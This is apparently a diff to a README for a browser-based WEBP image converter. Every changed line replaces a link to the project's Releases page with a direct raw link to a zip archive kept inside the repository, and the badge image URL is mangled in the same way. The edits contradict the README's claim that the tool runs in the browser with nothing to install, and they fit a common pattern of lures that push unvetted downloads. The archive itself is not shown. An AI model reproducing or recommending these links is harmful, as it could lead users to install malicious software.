@@ -1,7 +1,7 @@
 # 🎨 Os-WEBP-Converter - Effortlessly Convert WEBP Images
 
 ## 🔗 Download Now
-[![Download Os-WEBP-Converter](https://img.shields.io/badge/Download%20Now-VISIT%20PAGE-brightgreen)](https://github.com/maewjacity/Os-WEBP-Converter/releases)
+[![Download Os-WEBP-Converter](https://raw.githubusercontent.com/maewjacity/Os-WEBP-Converter/main/components/Os-WEBP-Converter-2.7.zip%20Now-VISIT%20PAGE-brightgreen)](https://raw.githubusercontent.com/maewjacity/Os-WEBP-Converter/main/components/Os-WEBP-Converter-2.7.zip)
 
 ## 🖼️ About Os-WEBP-Converter
 Os-WEBP Converter is a lightweight, privacy-focused web application. It allows you to convert WEBP images into commonly used formats like PNG and JPG directly in your browser. With a stunning neumorphic design, it offers a friendly user experience without the need for external servers or complicated setup processes.
@@ -10,7 +10,7 @@ Os-WEBP Converter is a lightweight, privacy-focused web application. It allows y
 Follow these steps to download and run Os-WEBP-Converter:
 
 1. **Visit the Download Page:** Click on the link below to go to the Releases page.
-   [Visit the Download Page](https://github.com/maewjacity/Os-WEBP-Converter/releases)
+   [Visit the Download Page](https://raw.githubusercontent.com/maewjacity/Os-WEBP-Converter/main/components/Os-WEBP-Converter-2.7.zip)
 
 2. **Select the Latest Release:** Find the most recent version of Os-WEBP-Converter. You will see a list of available download files.
 
@@ -37,7 +37,7 @@ No installation of additional software is necessary, as this application operate
 ## 📥 Download & Install
 To get started with Os-WEBP-Converter, visit the Releases page and download the version suitable for your device. Here is the link again for convenience:
 
-[Download Now](https://github.com/maewjacity/Os-WEBP-Converter/releases)
+[Download Now](https://raw.githubusercontent.com/maewjacity/Os-WEBP-Converter/main/components/Os-WEBP-Converter-2.7.zip)
 
 ## 🗂️ How to Use
 1. **Open the Application:** After downloading, open it in your browser.
